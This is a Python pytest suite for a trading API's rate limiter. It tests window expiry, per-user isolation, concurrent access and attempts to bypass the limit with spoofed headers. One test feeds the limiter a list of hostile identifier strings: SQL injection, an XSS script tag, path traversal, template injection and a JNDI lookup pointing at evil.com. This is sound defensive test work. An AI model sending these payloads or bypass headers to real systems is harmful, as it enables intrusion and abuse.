"""
Comprehensive Rate Limiting Security Tests

Tests rate limiting mechanisms, bypass attempts, and DoS protection.
These are real API security tests that validate actual rate limiting security.
"""

import pytest
import asyncio
import time
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import patch, MagicMock

from app.middleware import (
    RateLimiter, rate_limiter, create_jwt_token,
    RateLimitMiddleware, get_redis_client
)
from app.demo_jwt import generate_demo_jwt_token


class TestRateLimiterCore:
    """Test core rate limiting functionality."""

    @pytest.fixture
    def test_rate_limiter(self) -> RateLimiter:
        """Create a fresh rate limiter for testing."""
        return RateLimiter()

    def test_basic_rate_limiting(self, test_rate_limiter: RateLimiter):
        """Test basic rate limiting functionality."""
        identifier = "test_user"
        limit = 5
        window = 60  # 60 seconds
        
        # First requests should be allowed
        for i in range(limit):
            allowed, info = test_rate_limiter.is_allowed(identifier, limit, window)
            assert allowed, f"Request {i+1} should be allowed"
            assert info["remaining"] == limit - i - 1
            assert info["current_requests"] == i + 1
        
        # Next request should be denied
        allowed, info = test_rate_limiter.is_allowed(identifier, limit, window)
        assert not allowed, "Request over limit should be denied"
        assert info["remaining"] == 0
        assert info["current_requests"] == limit

    def test_window_expiration(self, test_rate_limiter: RateLimiter):
        """Test that rate limit windows expire correctly."""
        identifier = "test_user"
        limit = 3
        window = 2  # 2 seconds
        
        # Fill the rate limit
        for _ in range(limit):
            allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
            assert allowed
        
        # Should be blocked now
        allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
        assert not allowed
        
        # Wait for window to expire
        time.sleep(window + 0.5)
        
        # Should be allowed again
        allowed, info = test_rate_limiter.is_allowed(identifier, limit, window)
        assert allowed
        assert info["current_requests"] == 1

    def test_different_identifiers_isolation(self, test_rate_limiter: RateLimiter):
        """Test that different identifiers have separate rate limits."""
        limit = 3
        window = 60
        
        # Fill rate limit for user1
        for _ in range(limit):
            allowed, _ = test_rate_limiter.is_allowed("user1", limit, window)
            assert allowed
        
        # user1 should be blocked
        allowed, _ = test_rate_limiter.is_allowed("user1", limit, window)
        assert not allowed
        
        # user2 should still be allowed
        allowed, _ = test_rate_limiter.is_allowed("user2", limit, window)
        assert allowed

    def test_sliding_window_behavior(self, test_rate_limiter: RateLimiter):
        """Test sliding window rate limiting behavior."""
        identifier = "test_user"
        limit = 5
        window = 10  # 10 seconds
        
        # Make requests at specific times
        start_time = time.time()
        
        # Fill up the limit
        for i in range(limit):
            allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
            assert allowed
            time.sleep(0.1)  # Small delay between requests
        
        # Should be blocked
        allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
        assert not allowed
        
        # Wait for half the window
        time.sleep(window / 2)
        
        # Should still be blocked (sliding window)
        allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
        assert not allowed

    def test_concurrent_rate_limiting(self, test_rate_limiter: RateLimiter):
        """Test rate limiting under concurrent access."""
        identifier = "test_user"
        limit = 10
        window = 60
        
        results = []
        
        def make_request():
            return test_rate_limiter.is_allowed(identifier, limit, window)
        
        # Make concurrent requests
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(make_request) for _ in range(50)]
            
            for future in as_completed(futures):
                allowed, info = future.result()
                results.append(allowed)
        
        # Exactly 'limit' requests should be allowed
        allowed_count = sum(1 for allowed in results if allowed)
        assert allowed_count == limit, f"Expected {limit} allowed requests, got {allowed_count}"

    def test_redis_fallback_behavior(self, test_rate_limiter: RateLimiter):
        """Test fallback to memory when Redis is unavailable."""
        identifier = "test_user"
        limit = 3
        window = 60
        
        # Mock Redis failure
        with patch('app.middleware.get_redis_client', return_value=None):
            # Should still work with memory backend
            for i in range(limit):
                allowed, info = test_rate_limiter.is_allowed(identifier, limit, window)
                assert allowed
                assert info["current_requests"] == i + 1
            
            # Should be blocked after limit
            allowed, _ = test_rate_limiter.is_allowed(identifier, limit, window)
            assert not allowed

    def test_rate_limit_info_accuracy(self, test_rate_limiter: RateLimiter):
        """Test accuracy of rate limit information returned."""
        identifier = "test_user"
        limit = 5
        window = 60
        
        for i in range(limit):
            allowed, info = test_rate_limiter.is_allowed(identifier, limit, window)
            
            # Verify information accuracy
            assert info["limit"] == limit
            assert info["remaining"] == limit - i - 1
            assert info["current_requests"] == i + 1
            assert "reset_time" in info
            assert info["reset_time"] > time.time()


class TestRateLimitMiddleware:
    """Test rate limiting middleware security."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self, user_id: str = "test_user") -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": user_id, "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_endpoint_specific_rate_limits(self, base_url: str):
        """Test that different endpoints have appropriate rate limits."""
        headers = self.create_auth_headers("test_user_limits")
        
        # Test high-frequency endpoint (market data)
        market_endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        # Make multiple requests rapidly
        responses = []
        for i in range(10):
            response = requests.get(f"{base_url}{market_endpoint}", headers=headers)
            responses.append(response)
            
            # Check for rate limit headers
            if response.status_code == 200:
                assert "X-RateLimit-Limit" in response.headers
                assert "X-RateLimit-Remaining" in response.headers
                assert "X-RateLimit-Reset" in response.headers
            
            time.sleep(0.1)  # Small delay
        
        # Should eventually hit rate limit or all succeed
        status_codes = [r.status_code for r in responses]
        assert any(code in [200, 429] for code in status_codes)

    def test_rate_limit_bypass_attempts(self, base_url: str):
        """Test various rate limit bypass attempts."""
        endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        bypass_attempts = [
            # Different user agents
            {"User-Agent": "Different-Agent-1"},
            {"User-Agent": "Different-Agent-2"},
            
            # Proxy headers (should not affect rate limiting)
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Real-IP": "10.0.0.1"},
            {"X-Client-IP": "172.16.0.1"},
            
            # Custom headers to confuse rate limiter
            {"X-Rate-Limit-Bypass": "true"},
            {"X-Admin": "true"},
            {"X-Priority": "high"},
        ]
        
        user_id = "bypass_test_user"
        base_headers = self.create_auth_headers(user_id)
        
        # First, consume some of the rate limit
        for _ in range(30):  # Try to approach limit
            test_headers = {**base_headers}
            response = requests.get(f"{base_url}{endpoint}", headers=test_headers)
            
            if response.status_code == 429:
                # Good, we hit the rate limit
                break
            
            time.sleep(0.05)
        
        # Now try bypass attempts
        for attempt_headers in bypass_attempts:
            combined_headers = {**base_headers, **attempt_headers}
            response = requests.get(f"{base_url}{endpoint}", headers=combined_headers)
            
            # Should still be rate limited
            if response.status_code not in [200, 429]:
                # Other errors are acceptable (like 400, 422)
                continue
            
            # If we got a 200, the rate limit might have reset - that's OK
            # But 429 is what we expect for bypass attempts
            assert response.status_code in [200, 429], (
                f"Unexpected status {response.status_code} for bypass attempt {attempt_headers}"
            )

    def test_distributed_rate_limiting(self, base_url: str):
        """Test rate limiting across multiple 'distributed' requests."""
        headers = self.create_auth_headers("distributed_test_user")
        endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        # Simulate requests from different 'sources' with same user
        request_sources = [
            {"X-Source": "web"},
            {"X-Source": "mobile"},
            {"X-Source": "api"},
        ]
        
        all_responses = []
        
        # Make requests from different sources
        for source in request_sources:
            source_headers = {**headers, **source}
            
            for _ in range(15):  # Try to exceed typical limits
                response = requests.get(f"{base_url}{endpoint}", headers=source_headers)
                all_responses.append(response)
                time.sleep(0.05)
        
        # Should see rate limiting regardless of source
        status_codes = [r.status_code for r in all_responses]
        rate_limited_count = sum(1 for code in status_codes if code == 429)
        
        # Should have some rate limited responses if we exceeded limits
        # (Exact number depends on server configuration)
        assert any(code == 429 for code in status_codes[-10:]), "No rate limiting observed"

    def test_rate_limit_reset_functionality(self, base_url: str):
        """Test that rate limits reset properly after window expiration."""
        headers = self.create_auth_headers("reset_test_user")
        endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        # Hit rate limit
        rate_limited = False
        reset_time = None
        
        for _ in range(100):  # Try to exceed any reasonable limit
            response = requests.get(f"{base_url}{endpoint}", headers=headers)
            
            if response.status_code == 429:
                rate_limited = True
                if "X-RateLimit-Reset" in response.headers:
                    reset_time = int(response.headers["X-RateLimit-Reset"])
                break
            
            time.sleep(0.02)
        
        if rate_limited and reset_time:
            # Wait for reset (but not too long for tests)
            current_time = int(time.time())
            wait_time = min(reset_time - current_time + 1, 10)  # Max 10 seconds wait
            
            if wait_time > 0:
                time.sleep(wait_time)
                
                # Should be able to make requests again
                response = requests.get(f"{base_url}{endpoint}", headers=headers)
                assert response.status_code != 429, "Rate limit did not reset properly"

    def test_anonymous_user_rate_limiting(self, base_url: str):
        """Test rate limiting for anonymous/unauthenticated users."""
        # Public endpoints that don't require authentication
        public_endpoints = [
            "/api/v1/stocks/quote?symbol=AAPL",
            "/api/v1/health",
        ]
        
        for endpoint in public_endpoints:
            # Make requests without authentication
            responses = []
            for _ in range(20):  # Try to exceed limits
                response = requests.get(f"{base_url}{endpoint}")
                responses.append(response)
                time.sleep(0.05)
            
            # Should see some form of rate limiting or all succeed
            status_codes = [r.status_code for r in responses]
            # Anonymous requests might be allowed or rate limited
            assert all(code in [200, 401, 403, 429] for code in status_codes)


class TestRealAPIRateLimitingBehavior:
    """Test real API rate limiting behavior without mocking."""

    @pytest.fixture
    def base_url(self) -> str:
        """Base URL for API requests."""
        return "http://localhost:8090"

    def create_auth_headers(self, user_id: str) -> Dict[str, str]:
        """Create authorization headers for testing."""
        user_data = {"user_id": user_id, "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}

    def test_real_api_rate_limiting_enforcement(self, base_url: str):
        """Test actual API rate limiting enforcement with real requests."""
        headers = self.create_auth_headers("rate_limit_test_user")
        endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        # Track responses and timing
        responses = []
        start_time = time.time()
        rate_limited_count = 0
        
        # Make rapid requests to trigger rate limiting
        for i in range(100):  # Make many requests
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=2)
                responses.append({
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'timestamp': time.time()
                })
                
                if response.status_code == 429:
                    rate_limited_count += 1
                    # Verify rate limit headers are present
                    assert "X-RateLimit-Limit" in response.headers
                    assert "X-RateLimit-Remaining" in response.headers
                    assert "X-RateLimit-Reset" in response.headers
                    
                    # Parse rate limit info
                    limit = int(response.headers.get("X-RateLimit-Limit", 0))
                    remaining = int(response.headers.get("X-RateLimit-Remaining", 0))
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    
                    # Validate rate limit values
                    assert limit > 0, f"Invalid rate limit: {limit}"
                    assert remaining == 0, f"Should have 0 remaining when rate limited: {remaining}"
                    assert reset_time > time.time(), f"Reset time should be in future: {reset_time}"
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.05)
                
            except requests.exceptions.Timeout:
                # Timeouts can happen under load - record but continue
                responses.append({
                    'status_code': 'timeout',
                    'headers': {},
                    'timestamp': time.time()
                })
            except requests.exceptions.RequestException as e:
                # Other network errors
                responses.append({
                    'status_code': f'error_{type(e).__name__}',
                    'headers': {},
                    'timestamp': time.time()
                })
        
        # Analyze results
        total_time = time.time() - start_time
        successful_responses = [r for r in responses if r['status_code'] == 200]
        
        # Should have triggered some rate limiting
        assert rate_limited_count > 0, f"Expected rate limiting but got {rate_limited_count} 429 responses"
        
        # Rate limiting should be consistent
        if rate_limited_count > 0:
            print(f"Rate limiting triggered {rate_limited_count} times out of {len(responses)} requests")
            print(f"Successful responses: {len(successful_responses)}")
            print(f"Total test time: {total_time:.2f} seconds")

    def test_rate_limit_reset_behavior(self, base_url: str):
        """Test that rate limits actually reset after the window expires."""
        headers = self.create_auth_headers("reset_behavior_user")
        endpoint = "/api/v1/stocks/quote?symbol=MSFT"
        
        # First, trigger rate limiting
        rate_limited = False
        reset_time = None
        
        for _ in range(150):  # Exceed typical rate limits
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=2)
                
                if response.status_code == 429:
                    rate_limited = True
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    break
                    
                time.sleep(0.02)
                
            except requests.exceptions.RequestException:
                continue
        
        if rate_limited and reset_time:
            current_time = int(time.time())
            wait_time = reset_time - current_time
            
            # Wait for rate limit to reset (but not too long for tests)
            if 0 < wait_time <= 10:  # Only wait if reasonable
                print(f"Waiting {wait_time} seconds for rate limit reset")
                time.sleep(wait_time + 1)
                
                # Try request again after reset
                try:
                    response = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
                    # Should not be rate limited anymore
                    assert response.status_code != 429, (
                        f"Still rate limited after reset time: {response.status_code}"
                    )
                    print("Rate limit reset successfully verified")
                    
                except requests.exceptions.RequestException as e:
                    print(f"Network error after reset: {e}")

    def test_per_user_rate_limiting_isolation(self, base_url: str):
        """Test that rate limits are properly isolated per user."""
        endpoint = "/api/v1/stocks/quote?symbol=TSLA"
        
        # Create headers for different users
        user1_headers = self.create_auth_headers("isolation_user1")
        user2_headers = self.create_auth_headers("isolation_user2")
        
        # First user hits rate limit
        user1_rate_limited = False
        for _ in range(80):
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=user1_headers, timeout=2)
                if response.status_code == 429:
                    user1_rate_limited = True
                    break
                time.sleep(0.02)
            except requests.exceptions.RequestException:
                continue
        
        # Second user should still be able to make requests
        if user1_rate_limited:
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=user2_headers, timeout=5)
                
                # User2 should not be affected by User1's rate limiting
                assert response.status_code != 429, (
                    "User isolation failed - User2 affected by User1's rate limiting"
                )
                print("Per-user rate limit isolation verified")
                
            except requests.exceptions.RequestException as e:
                print(f"Network error during isolation test: {e}")

    def test_rate_limit_attack_resistance(self, base_url: str):
        """Test resistance to rate limiting attacks."""
        endpoint = "/api/v1/stocks/quote?symbol=GOOGL"
        base_headers = self.create_auth_headers("attack_resistance_user")
        
        # Test various bypass attempts
        attack_attempts = [
            # Header manipulation attempts
            {**base_headers, "X-Forwarded-For": "192.168.1.100"},
            {**base_headers, "X-Real-IP": "10.0.0.1"},
            {**base_headers, "X-Client-IP": "172.16.0.1"},
            {**base_headers, "X-Rate-Limit-Bypass": "true"},
            {**base_headers, "X-Admin": "true"},
            {**base_headers, "User-Agent": "AdminBot/1.0"},
        ]
        
        # First, consume some rate limit with normal requests
        normal_success_count = 0
        for _ in range(30):
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=base_headers, timeout=2)
                if response.status_code == 200:
                    normal_success_count += 1
                elif response.status_code == 429:
                    break
                time.sleep(0.05)
            except requests.exceptions.RequestException:
                continue
        
        # Now try bypass attempts
        bypass_success_count = 0
        for attack_headers in attack_attempts:
            try:
                response = requests.get(f"{base_url}{endpoint}", headers=attack_headers, timeout=2)
                if response.status_code == 200:
                    bypass_success_count += 1
                time.sleep(0.1)
            except requests.exceptions.RequestException:
                continue
        
        # Rate limiting should not be bypassable
        print(f"Normal requests succeeded: {normal_success_count}")
        print(f"Bypass attempts succeeded: {bypass_success_count}")
        
        # If we had normal rate limiting, bypass shouldn't work significantly better
        if normal_success_count < 20:  # If we hit rate limits normally
            assert bypass_success_count < len(attack_attempts), (
                "Rate limiting bypass attacks appear to be successful"
            )


class TestRateLimitSecurityFeatures:
    """Test security-specific rate limiting features."""

    def test_burst_request_handling(self):
        """Test handling of burst requests."""
        test_limiter = RateLimiter()
        identifier = "burst_user"
        limit = 10
        window = 60
        
        start_time = time.time()
        
        # Make burst requests
        burst_results = []
        for _ in range(50):  # Much more than limit
            allowed, info = test_limiter.is_allowed(identifier, limit, window)
            burst_results.append(allowed)
        
        end_time = time.time()
        
        # Should handle burst without crashing
        allowed_count = sum(1 for allowed in burst_results if allowed)
        assert allowed_count <= limit
        
        # Should complete quickly (not hang)
        assert end_time - start_time < 5.0, "Burst handling took too long"

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        test_limiter = RateLimiter()
        limit = 1
        window = 60
        
        # Try to create many different identifiers
        unique_identifiers = [f"user_{i}" for i in range(10000)]
        
        start_time = time.time()
        
        for identifier in unique_identifiers[:1000]:  # Test subset to avoid test timeout
            allowed, _ = test_limiter.is_allowed(identifier, limit, window)
            # Each should be allowed once
            assert allowed
        
        end_time = time.time()
        
        # Should handle many identifiers without significant slowdown
        assert end_time - start_time < 10.0, "Memory exhaustion test took too long"

    def test_identifier_injection_protection(self):
        """Test protection against identifier injection attacks."""
        test_limiter = RateLimiter()
        limit = 5
        window = 60
        
        # Try malicious identifiers
        malicious_identifiers = [
            "user:1; DROP TABLE users; --",
            "user:1<script>alert('xss')</script>",
            "user:1\x00admin",
            "user:1\n\radmin",
            "user:1/../admin",
            "user:1${jndi:ldap://evil.com/}",
            "user:1#{7*7}",  # Template injection attempt
        ]
        
        for identifier in malicious_identifiers:
            try:
                # Should handle malicious identifiers gracefully
                allowed, info = test_limiter.is_allowed(identifier, limit, window)
                
                # Should return valid rate limit info
                assert isinstance(allowed, bool)
                assert isinstance(info, dict)
                assert "limit" in info
                assert "remaining" in info
                
            except Exception as e:
                # Should not raise unhandled exceptions
                pytest.fail(f"Rate limiter failed with malicious identifier '{identifier}': {e}")

    def test_time_manipulation_resistance(self):
        """Test resistance to time manipulation attacks."""
        test_limiter = RateLimiter()
        identifier = "time_attack_user"
        limit = 3
        window = 60
        
        # Fill the rate limit
        for _ in range(limit):
            allowed, _ = test_limiter.is_allowed(identifier, limit, window)
            assert allowed
        
        # Should be blocked
        allowed, _ = test_limiter.is_allowed(identifier, limit, window)
        assert not allowed
        
        # Try to manipulate time (this is just conceptual - actual time manipulation
        # would require system-level changes which we can't do in unit tests)
        # But we can test that the rate limiter uses consistent time sources
        
        # Make another request immediately - should still be blocked
        allowed, _ = test_limiter.is_allowed(identifier, limit, window)
        assert not allowed

    def test_rate_limit_header_security(self, base_url: str):
        """Test that rate limit headers don't leak sensitive information."""
        headers = self.create_auth_headers("header_test_user")
        endpoint = "/api/v1/stocks/quote?symbol=AAPL"
        
        response = requests.get(f"{base_url}{endpoint}", headers=headers)
        
        if "X-RateLimit-Limit" in response.headers:
            limit_header = response.headers["X-RateLimit-Limit"]
            remaining_header = response.headers.get("X-RateLimit-Remaining", "")
            reset_header = response.headers.get("X-RateLimit-Reset", "")
            
            # Headers should contain only numeric values
            assert limit_header.isdigit(), f"Limit header not numeric: {limit_header}"
            
            if remaining_header:
                assert remaining_header.isdigit(), f"Remaining header not numeric: {remaining_header}"
            
            if reset_header:
                assert reset_header.isdigit(), f"Reset header not numeric: {reset_header}"
            
            # Should not contain internal system information
            sensitive_patterns = ["redis", "memory", "error", "exception", "traceback"]
            all_headers = " ".join([limit_header, remaining_header, reset_header]).lower()
            
            for pattern in sensitive_patterns:
                assert pattern not in all_headers, (
                    f"Rate limit header contains sensitive information: {pattern}"
                )

    def create_auth_headers(self, user_id: str) -> Dict[str, str]:
        """Helper method to create auth headers."""
        user_data = {"user_id": user_id, "permissions": ["trading", "market_data"]}
        token = create_jwt_token(user_data)
        return {"Authorization": f"Bearer {token}"}